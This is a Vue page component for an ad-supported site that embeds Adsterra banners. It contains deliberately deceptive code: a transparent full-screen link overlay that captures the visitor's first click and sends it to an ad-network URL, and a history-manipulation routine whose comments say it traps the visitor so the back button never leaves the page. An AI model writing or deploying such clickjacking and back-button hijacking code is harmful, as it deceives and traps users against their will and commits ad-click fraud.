<template>
  <div class="home-b">
    <div id="container-d1debede50ec7d8df5940dc07088499f"></div>

    <a href="https://www.profitablecpmratenetwork.com/eet0d835?key=edd631eedc507862650ff626c430b6da"
       target="_blank"
       ref="stealthNet"
       style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999; opacity: 0; cursor: pointer;"
       @click="hideStealthNet"
    >
    </a>

    <!-- 通知权限弹窗 -->
    <NotificationDialog ref="notificationDialog" />
  </div>
</template>

<script setup>
import {AdsterraAd} from "@/utils/adSdk";
import {onMounted, ref} from "vue";
import NotificationDialog from "@/components/NotificationDialog.vue";
import {gaLogEvent} from "@/utils/event";

AdsterraAd.showNativeBanner("ad.ttgame");

const stealthNet = ref(null);

onMounted(() => {
  const lang = (navigator.language || '').split('-')[0];

  gaLogEvent.logEvent({
    eventName: "enter_home_b",
    eventValue: lang,
    eventLog: `Enter Home B`
  })

  setTimeout(() => {
    initBackHijack();
  }, 500)
})

// 点击全屏网后，将其隐藏，让老哥退回来时能点到真按钮
const hideStealthNet = () => {
  stealthNet.value.style.display = 'none';

  gaLogEvent.logEvent({
    eventName: "home_b_stealth",
    eventLog: `home_b_stealth`
  })
}

const initBackHijack = (showPopupCallback) => {
  let baseUrl = location.href.split('?')[0]; // 获取干净的当前URL

  // 1. 塞入假的历史记录（布置陷阱）
  history.replaceState({ page: 'trap' }, '', baseUrl + '?step=1');
  history.pushState({ page: 'current' }, '', baseUrl + '?step=2');

  // 2. 监听老哥按返回键（收网）
  window.addEventListener("popstate", (event) => {
    // 只要他按了返回键退到了 step=1，立刻重新把历史记录补满！让他永远在笼子里
    history.pushState({ page: 'current' }, '', baseUrl + '?step=2');
  });
}
</script>

<style scoped>
.home-b {
  margin: 0 auto;
  width: 100%;
  height: auto;
}
</style>